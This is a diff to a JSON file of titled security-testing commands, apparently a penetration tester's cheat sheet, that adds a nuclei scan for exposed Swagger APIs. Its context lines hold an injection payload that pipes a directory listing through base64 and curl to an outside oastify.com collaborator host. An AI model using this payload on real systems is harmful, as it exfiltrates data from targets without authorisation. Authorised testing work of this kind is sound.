@@ -108,5 +108,12 @@
             "  \"input\":\":!ls | base64 |curl -d @- https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
             "}"
         ]
+    },
+    {
+        "title": "GET SWAGGER APIS",
+        "subtitle": "This will fetch all available swagger pages from the host file given",
+        "commands": [
+            "nuclei -list hosts_alive.txt -t /home/aceos/nuclei-templates/http/exposures/apis/swagger-api.yaml"
+        ]
     }
 ]
